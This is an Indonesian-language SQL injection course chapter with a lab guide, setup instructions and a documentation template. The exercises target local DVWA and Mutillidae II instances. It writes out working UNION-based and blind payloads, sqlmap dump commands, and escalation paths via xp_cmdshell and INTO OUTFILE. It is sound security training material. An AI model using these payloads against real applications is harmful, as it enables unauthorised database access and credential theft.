# Daftar Isi

- [Isi Paket](#isi-paket)
- [Ringkasan Textbook](#ringkasan-textbook)
- [Step by Step dan Link Youtube](#step-by-step-dan-link-youtube)
- [Resource Praktikum](#resource-praktikum)
- [Template Dokumentasi](#template-dokumentasi)

# Isi paket
- **`Bab_07_Ringkasan_Textbook_SQL_Injection.md`** — dasar SQL & karakter komentar per-DBMS, kenapa query dinamis berbahaya, deteksi error-based, UNION-based (dengan teknik `ORDER BY` untuk menentukan jumlah kolom), blind SQLi (boolean-based & time-based), eskalasi menuju eksekusi kode (`xp_cmdshell`, `INTO OUTFILE`), automasi sqlmap + tamper script, ditutup dengan wawasan second-order SQLi dan NoSQL injection.
- **`Bab_07_Modul_Praktikum_SQL_Injection.md`** — praktikum bertahap di **DVWA** (error detection → UNION manual → blind manual → sqlmap) plus latihan tambahan di **Mutillidae II**.
- **`resources/`**:
    - `docker-compose.yml` — DVWA + Mutillidae II.
    - `Vagrantfile` + `provision.sh` — Kali dengan sqlmap, Python3+requests, Burp Suite.
    - `blind_sqli_helper.py` — script Python pembantu ekstraksi blind boolean-based karakter-per-karakter, sengaja saya beri catatan tegas di dalamnya: harus dicoba manual dulu sebelum pakai script (sesuai semangat "self-paced zero-to-mastery" dari outline awal), plus jeda kecil antar request sebagai kebiasaan sopan terhadap server.
    - `payload_reference.txt` — kumpulan payload siap pakai untuk semua teknik di bab ini.
    - `template_dokumentasi_sqli.md` — termasuk kolom perbandingan waktu manual vs otomatis sesuai tantangan mastery di textbook.
    - `README.md` — panduan lengkap.

# Ringkasan Textbook

Kalau ada satu kerentanan yang jadi "ikon" dunia keamanan aplikasi web, SQL Injection layak jadi juaranya. Bukan cuma karena dampaknya bisa sangat parah (bayangkan seluruh database pelanggan bocor dari satu parameter form login yang lupa divalidasi), tapi juga karena kerentanan ini sudah dikenal sejak akhir 1990-an dan — anehnya — masih terus muncul sampai hari ini di aplikasi-aplikasi baru. Kalau kamu penasaran kenapa bisa begitu, jawabannya sederhana: developer terus lahir baru, dan nggak semua dari mereka diajari dengan benar soal bahaya query dinamis yang tidak di-parameterisasi.

Bab ini akan membawa kamu dari pemahaman dasar SQL sampai teknik ekstraksi data yang cukup canggih. Siap-siap, karena ini salah satu bab paling "hands-on-heavy" di buku ini.

## 7.1 Menyegarkan Ingatan: Dasar SQL

Sebelum ngebahas cara mengeksploitasinya, pastikan dulu kamu paham fondasi bahasa SQL itu sendiri.

Statement paling dasar, `SELECT`, dipakai untuk mengambil data: `SELECT username, password FROM users WHERE id = 1`. Klausa `WHERE` menentukan kondisi filter — dan ini justru jadi titik paling rawan, karena hampir selalu berisi input yang berasal dari user (misalnya ID yang diketik di URL, atau username yang dimasukkan di form login).

`UNION` adalah operator yang menggabungkan hasil dari dua query `SELECT` berbeda jadi satu himpunan hasil — nanti kamu akan lihat kenapa operator ini jadi senjata utama teknik UNION-based injection.

Setiap DBMS (Database Management System) punya sedikit perbedaan sintaks, terutama soal **karakter komentar** yang dipakai untuk "mematikan" sisa query asli setelah payload kita disisipkan:
- **MySQL**: `-- ` (perhatikan ada spasi setelah dua dash) atau `#`
- **MSSQL**: `--`
- **PostgreSQL**: `--`
- **SQLite**: `--`

Kelihatan sepele, tapi salah pilih karakter komentar adalah salah satu penyebab paling umum kenapa payload SQLi yang "harusnya benar" ternyata gagal — kamu perlu tahu dulu DBMS apa yang dipakai target sebelum menyusun payload yang presisi.

## 7.2 Kenapa Query Dinamis Jadi Sumber Masalah

Bayangkan kode backend (dalam bahasa pseudocode) seperti ini:

```
query = "SELECT * FROM users WHERE username = '" + input_user + "' AND password = '" + input_password + "'"
```

Kalau `input_user` diisi normal seperti `budi`, query jadi `SELECT * FROM users WHERE username = 'budi' AND password = '...'` — aman-aman saja. Tapi kalau `input_user` diisi `' OR '1'='1`, query berubah jadi:

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
```

Kondisi `'1'='1'` selalu bernilai true, jadi klausa `WHERE` ini secara efektif "menerima semua baris" — dalam konteks login, ini bisa berarti berhasil login tanpa tahu password sama sekali (tergantung struktur query lengkapnya dan urutan operator AND/OR).

Ini contoh paling sederhana untuk menunjukkan akar masalahnya: **input user tercampur langsung ke dalam struktur query**, bukan diperlakukan murni sebagai data.

## 7.3 Deteksi Berbasis Error

Cara paling gampang (dan sering jadi langkah pertama) untuk mengecek potensi SQLi adalah dengan sengaja "merusak" sintaks query pakai karakter quote tunggal (`'`). Kalau aplikasi merespons dengan pesan error database (misalnya error MySQL yang menyebutkan syntax error di sekitar quote yang kamu masukkan), itu indikasi kuat input kamu langsung masuk ke query tanpa sanitasi.

Pesan error ini sendiri sering jadi harta karun — banyak aplikasi (terutama di lingkungan development yang lupa dimatikan mode debug-nya) menampilkan pesan error database secara mentah, yang kadang sudah cukup untuk mengungkap struktur tabel atau bahkan versi DBMS yang dipakai.

## 7.4 UNION-Based Injection: Teknik Ekstraksi Paling Populer

Begitu kamu yakin sebuah parameter rentan, langkah selanjutnya biasanya menuju **UNION-based injection** — teknik yang memanfaatkan operator `UNION` untuk "menempelkan" hasil query tambahan ke response yang sama.

Tapi ada syarat teknis penting: `UNION` cuma bisa menggabungkan dua `SELECT` yang punya **jumlah kolom yang sama**. Jadi langkah pertama adalah menentukan berapa jumlah kolom query asli, biasanya dengan teknik `ORDER BY` bertahap:

```sql
' ORDER BY 1-- 
' ORDER BY 2-- 
' ORDER BY 3-- 
```

Terus naikkan angkanya sampai muncul error ("Unknown column") — itu tandanya jumlah kolom asli adalah angka sebelum yang error tadi.

Setelah tahu jumlah kolom, kamu bisa mulai menyusun payload UNION untuk mengekstrak data sungguhan:

```sql
' UNION SELECT username, password FROM users-- 
```

(Jumlah kolom di `SELECT` kedua ini harus persis sama dengan yang ditemukan lewat teknik `ORDER BY` tadi.)

Dari sini, kamu bisa memperluas terus — mengekstrak nama tabel dan kolom lain lewat tabel metadata seperti `information_schema` (khusus MySQL/MSSQL/PostgreSQL), sampai akhirnya benar-benar mendapatkan data sensitif yang kamu incar.

## 7.5 Blind SQL Injection: Ketika Tidak Ada Output Langsung

Nggak semua aplikasi seramah itu menampilkan hasil query langsung ke response. Kadang, satu-satunya informasi yang kamu punya cuma: apakah halaman terlihat "normal" atau "berbeda" (blind boolean-based), atau apakah response butuh waktu lebih lama dari biasanya (blind time-based).

**Boolean-based blind** memanfaatkan kondisi true/false untuk menyimpulkan informasi, satu bit demi satu bit. Contoh konsep: kamu kirim payload yang mengandung kondisi seperti `AND SUBSTRING(password,1,1)='a'` — kalau halaman merespons "normal" (misal menampilkan konten tertentu), berarti karakter pertama password memang `a`. Kalau tidak, coba karakter lain. Proses ini diulang untuk setiap posisi karakter sampai seluruh string berhasil direkonstruksi — jelas sangat memakan waktu kalau dilakukan manual sepenuhnya, tapi sangat mendidik untuk dilakukan minimal sekali secara manual supaya kamu benar-benar paham mekanismenya sebelum mengandalkan automasi.

**Time-based blind** dipakai ketika bahkan perbedaan konten response pun tidak ada — satu-satunya sinyal yang tersisa adalah waktu. Payload seperti `AND IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)` akan membuat response tertunda 5 detik hanya jika kondisi tersebut benar, memberimu sinyal yang cukup jelas meski tidak ada perbedaan konten sama sekali.

## 7.6 Dari Injeksi Menuju Eksekusi Kode

Di kondisi tertentu (tergantung konfigurasi DBMS dan hak akses user database), SQL Injection bisa dieskalasi jauh lebih jauh dari sekadar baca data.

Di **MSSQL**, stored procedure `xp_cmdshell` (kalau diaktifkan, yang untungnya dinonaktifkan secara default di instalasi modern) memungkinkan eksekusi command sistem operasi langsung dari dalam query SQL.

Di **MySQL**, klausa `INTO OUTFILE` bisa dipakai untuk menulis hasil query ke file di server (kalau permission dan konfigurasi `secure_file_priv` mengizinkan) — kalau kamu bisa menulis file PHP ke direktori yang bisa diakses web, ini jalur langsung menuju Remote Code Execution, mirip konsepnya dengan file upload vulnerability yang kita bahas di Bab 6.

## 7.7 Automasi dengan sqlmap

Setelah paham mekanisme manual (yang saya harap sudah betul-betul melekat di kepala kamu sekarang), saatnya kenalan dengan **sqlmap** — tool automasi SQL injection paling populer di dunia pentest. sqlmap bisa mendeteksi, mengonfirmasi, dan mengeksploitasi hampir semua variasi SQLi yang sudah kita bahas, termasuk ekstraksi database, tabel, kolom, sampai data sungguhan, semuanya lewat satu command.

Fitur yang cukup powerful: **tamper script**, kumpulan skrip modifikasi payload otomatis yang dirancang untuk membantu bypass WAF (Web Application Firewall) dasar — misalnya dengan mengubah encoding, menambah komentar acak di tengah keyword SQL, atau variasi case, supaya payload tidak terdeteksi signature WAF yang mencari pola literal tertentu.

## 7.8 Perluasan Wawasan: Second-Order SQLi dan NoSQL Injection

Dua hal ini sering luput dari pemula tapi penting untuk tahu keberadaannya.

**Second-order SQL injection** terjadi ketika payload yang kamu masukkan tidak langsung dieksekusi di request yang sama, tapi disimpan dulu (misalnya di database), lalu dieksekusi belakangan saat data tersebut dipakai di query lain di bagian aplikasi yang berbeda. Ini kenapa "input yang kelihatannya aman karena tidak langsung memicu error" belum tentu benar-benar aman — bisa jadi bom waktu yang meledak di tempat lain.

**NoSQL Injection** adalah pengingat bahwa dunia tidak berhenti di database relasional. Database seperti MongoDB punya sintaks query berbasis operator (`$gt`, `$ne`, `$where`, dan sebagainya) yang, kalau input user tidak divalidasi dengan benar, bisa dimanipulasi mirip semangatnya dengan SQL Injection klasik — misalnya mengirim objek JSON `{"$ne": null}` sebagai password untuk melewati pengecekan autentikasi yang naif.

## Rangkuman Bab

- Pahami dasar SQL dan karakter komentar per-DBMS sebelum menyusun payload presisi.
- Query dinamis yang mencampur input user langsung ke struktur query adalah akar masalah SQLi.
- Deteksi berbasis error adalah langkah awal paling sederhana.
- UNION-based injection butuh penentuan jumlah kolom lebih dulu (teknik `ORDER BY`).
- Blind SQLi (boolean-based dan time-based) dipakai ketika tidak ada output langsung — penting dipahami manual sebelum mengandalkan automasi.
- SQLi bisa dieskalasi ke eksekusi kode lewat fitur spesifik DBMS (`xp_cmdshell`, `INTO OUTFILE`).
- sqlmap mengotomasi hampir seluruh proses, dengan tamper script untuk bypass WAF dasar.
- Second-order SQLi dan NoSQL injection memperluas wawasan di luar SQLi klasik yang paling umum diajarkan.

## Checkpoint Mandiri

1. Bisakah kamu jelaskan kenapa prepared statement/parameterized query menghilangkan risiko SQLi secara struktural, bukan cuma "mitigasi tambahan"?
2. Kenapa teknik `ORDER BY` diperlukan sebelum menyusun payload UNION-based yang benar?
3. Dalam kondisi seperti apa time-based blind SQLi jadi satu-satunya opsi yang tersisa untuk membuktikan kerentanan?

## Tantangan Mastery

Ekstrak seluruh isi tabel pengguna (minimal username dan password hash) dari target lab menggunakan teknik **blind boolean-based secara manual** (tanpa sqlmap) untuk membuktikan pemahaman konsep — meski hanya untuk beberapa karakter pertama sebagai bukti konsep. Setelah itu, baru validasi ulang dan selesaikan ekstraksi penuh menggunakan sqlmap, lalu bandingkan: berapa lama waktu yang kamu habiskan manual vs otomatis?

## Sumber Bacaan Lanjutan

- PortSwigger Web Security Academy, topik "SQL injection" (lengkap dengan lab interaktif gratis): https://portswigger.net/web-security/sql-injection
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- Dokumentasi resmi sqlmap: https://github.com/sqlmapproject/sqlmap/wiki

# Step by Step dan Link Youtube
Target praktikum bab ini: **DVWA** (lagi, tapi modul berbeda) dan **Mutillidae II** — target kedua kita pilih khusus karena punya variasi DBMS dan skenario yang sedikit berbeda dari DVWA, bagus untuk melihat bagaimana prinsip yang sama diterapkan di konteks berbeda.

## 7.1 Menjalankan Target

```bash
docker compose up -d
```

- DVWA: `http://localhost:8081` (set security level ke "low" dulu seperti biasa)
- Mutillidae II: `http://localhost:8083`

## 7.2 Deteksi Awal Berbasis Error

**Target: DVWA — modul "SQL Injection"**

1. Buka modul SQL Injection, perhatikan input field (biasanya form "User ID").
2. Masukkan quote tunggal (`'`) di field tersebut, submit.
3. Perhatikan apakah muncul pesan error database. Catat pesan errornya persis di `01-sqli-notes.md` — ini akan memberi petunjuk soal DBMS yang dipakai.

## 7.3 UNION-Based Injection Manual

1. Tentukan jumlah kolom dengan `ORDER BY` bertahap:
   ```
   1' ORDER BY 1-- -
   1' ORDER BY 2-- -
   1' ORDER BY 3-- -
   ```
   (Perhatikan format komentar `-- -` dengan spasi tambahan di akhir, kadang dibutuhkan tergantung cara parameter diproses aplikasi.)
2. Setelah tahu jumlah kolom, susun payload UNION untuk mengekstrak informasi database itu sendiri:
   ```
   1' UNION SELECT database(), version()-- -
   ```
3. Lanjutkan mengekstrak nama tabel:
   ```
   1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
   ```
4. Lanjutkan mengekstrak nama kolom dari tabel yang menarik (biasanya ada tabel `users`):
   ```
   1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
   ```
5. Terakhir, ekstrak data sungguhan:
   ```
   1' UNION SELECT user, password FROM users-- -
   ```

Dokumentasikan setiap tahap ini — proses bertahap seperti ini justru yang paling penting untuk dipahami, bukan cuma hasil akhirnya.

## 7.4 Blind SQL Injection Manual (Boolean-Based)

Ini bagian yang paling melatih kesabaran, tapi sangat penting untuk benar-benar dipahami.
**Jalankan dulu minimal 3-4 karakter pertama secara manual** (satu per satu lewat browser/Burp Repeater) sebelum beralih ke script, supaya kamu benar-benar paham mekanismenya:

```
1' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a
```

Ganti karakter `'a'` menjadi karakter alfanumerik lain dan amati perbedaan response (biasanya lewat perbedaan pesan yang ditampilkan aplikasi untuk kondisi true vs false).

Setelah paham manual, gunakan script `blind_sqli_helper.py` yang sudah disediakan untuk membantu proses ekstraksi karakter-per-karakter:

```bash
python3 blind_sqli_helper.py --url "http://localhost:8081/vulnerabilities/sqli_blind/" --cookie "PHPSESSID=<isi-punyamu>; security=low"
```


## 7.5 Validasi dan Ekstraksi Penuh dengan sqlmap

Sekarang bandingkan hasil manual kamu dengan automasi penuh:

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<isi-punyamu>; security=low" \
  --dbs
```

Setelah menemukan nama database, lanjutkan ekstraksi tabel dan data:

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<isi-punyamu>; security=low" \
  -D dvwa --tables

sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<isi-punyamu>; security=low" \
  -D dvwa -T users --dump
```

## 7.6 Latihan Tambahan di Mutillidae II

Mutillidae II punya beberapa variasi skenario SQLi (termasuk kadang dengan backend berbeda). Jelajahi menu "OWASP Top 10" di navigasi Mutillidae, cari kategori Injection, dan coba terapkan seluruh teknik yang sama (error-based, UNION-based, blind) terhadap skenario yang tersedia di sana.

## 7.7 Mendokumentasikan Waktu Manual vs Otomatis

Sesuai Tantangan Mastery di textbook, catat di `02-perbandingan-waktu.md`: berapa lama waktu yang kamu habiskan melakukan blind SQLi manual (meski cuma beberapa karakter) dibanding waktu sqlmap menyelesaikan ekstraksi penuh secara otomatis. Refleksikan: dalam skenario nyata, kapan sebaiknya kamu tetap melakukan sedikit validasi manual meski punya akses ke sqlmap?

## Checkpoint Praktikum

- [ ] Berhasil mengidentifikasi SQLi lewat deteksi error di DVWA.
- [ ] Berhasil menentukan jumlah kolom dan melakukan ekstraksi data lewat UNION-based injection secara manual.
- [ ] Berhasil melakukan minimal beberapa karakter ekstraksi blind boolean-based secara manual.
- [ ] Berhasil menjalankan sqlmap untuk validasi dan ekstraksi penuh.
- [ ] Mencoba minimal 1 skenario SQLi tambahan di Mutillidae II.
- [ ] Perbandingan waktu manual vs otomatis terdokumentasi dengan refleksi yang jelas.

## Sumber Daya Pendukung

Semua file teknis — `docker-compose.yml` (DVWA + Mutillidae II), provisioning Vagrant untuk Kali dengan sqlmap, script pembantu blind SQLi manual, dan template dokumentasi — ada di paket resource yang menyertai modul ini.

> **Pengingat etika**: seluruh teknik di bab ini HANYA untuk dipraktikkan terhadap target lab lokal (DVWA/Mutillidae II) yang kamu jalankan sendiri.

## YouTube Tutorial Step-by-Step

https://youtu.be/hu8ncoPnaew

# Resource praktikum

## Isi Paket

| File | Fungsi |
|---|---|
| `docker-compose.yml` | Menjalankan DVWA + Mutillidae II |
| `Vagrantfile` | Provisioning VM Kali attacker |
| `provision.sh` | Instalasi sqlmap, Python3+requests, Burp Suite, Docker |
| `blind_sqli_helper.py` | Script pembantu ekstraksi blind boolean-based SQLi |
| `payload_reference.txt` | Referensi payload siap pakai untuk semua teknik di bab ini |
| `template_dokumentasi_sqli.md` | Template dokumentasi lengkap |

## Langkah 1 — Setup Kali Attacker

```bash
vagrant up
vagrant ssh
```

## Langkah 2 — Jalankan Target

```bash
docker compose up -d
```

- DVWA: `http://localhost:8081` (set security level ke "low", lalu naikkan bertahap sesuai instruksi modul)
- Mutillidae II: `http://localhost:8083`

## Langkah 3 — Deteksi & UNION-Based Manual

Gunakan `payload_reference.txt` sebagai contekan payload, ikuti urutan langkah di modul praktikum (`Bab_07_Modul_Praktikum_SQL_Injection.md`).

## Langkah 4 — Blind SQLi Manual, Lalu Script

Setelah mencoba manual minimal 3-4 karakter (WAJIB, jangan skip demi pemahaman konsep), jalankan:

```bash
chmod +x blind_sqli_helper.py
python3 blind_sqli_helper.py \
  --url "http://localhost:8081/vulnerabilities/sqli_blind/" \
  --cookie "PHPSESSID=<isi-punyamu>; security=medium" \
  --true-marker "User ID exists"
```

**Catatan penting**: nilai `--true-marker` harus disesuaikan dengan hasil observasi manualmu sendiri — perhatikan teks apa yang muncul di response saat kondisi TRUE vs FALSE (biasanya terlihat jelas bedanya saat kamu bandingkan payload dengan karakter benar vs salah secara manual di langkah sebelumnya).

## Langkah 5 — Validasi dengan sqlmap

```bash
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<isi-punyamu>; security=low" \
  --dbs --batch
```

Tambahkan `-D <nama-db> --tables` lalu `-T users --dump` untuk ekstraksi lengkap (lihat modul praktikum untuk urutan lengkapnya).

## Langkah 6 — Dokumentasikan

```bash
cp template_dokumentasi_sqli.md ~/Lab-Notes/Bab-07-SQLi/03-dokumentasi-sqli.md
```

## Catatan Etika & Keamanan Lab

- Seluruh teknik dan script di paket ini HANYA untuk target lab lokal terisolasi (DVWA/Mutillidae II).
- `blind_sqli_helper.py` sengaja diberi jeda kecil antar request (`time.sleep`) sebagai kebiasaan baik agar tidak membebani server secara berlebihan — pertahankan kebiasaan ini bahkan di lingkungan lab sendiri.
- Matikan container setelah selesai:
  ```bash
  docker compose down
  ```
# Template dokumentasi

## Info Umum
- **Target**: (DVWA / Mutillidae II)
- **Security Level**: (low/medium/high)
- **DBMS terdeteksi**:
- **Tanggal**:

## 1. Deteksi Error-Based
- **Payload**:
- **Pesan error yang muncul**:
- **Info yang terungkap dari pesan error**:

## 2. UNION-Based Injection

| Langkah | Payload | Hasil |
|---|---|---|
| Menentukan jumlah kolom | | |
| Ekstraksi database()/version() | | |
| Ekstraksi nama tabel | | |
| Ekstraksi nama kolom | | |
| Ekstraksi data users | | |

## 3. Blind Boolean-Based (Manual)

| Posisi Karakter | Payload | True/False | Karakter Ditemukan |
|---|---|---|---|
| 1 | | | |
| 2 | | | |
| 3 | | | |

**Hasil manual (beberapa karakter pertama)**:
**Hasil lengkap via script/sqlmap**:

## 4. Validasi dengan sqlmap
- **Command yang dipakai**:
- **Database ditemukan**:
- **Tabel ditemukan**:
- **Data hasil dump (ringkas)**:

## 5. Perbandingan Waktu Manual vs Otomatis
- **Waktu manual** (untuk beberapa karakter): ___ menit
- **Waktu sqlmap** (ekstraksi penuh): ___ menit
- **Refleksi**: kapan validasi manual tetap penting meski ada sqlmap?

## 6. Latihan Tambahan di Mutillidae II
- **Skenario yang dicoba**:
- **Hasil**:

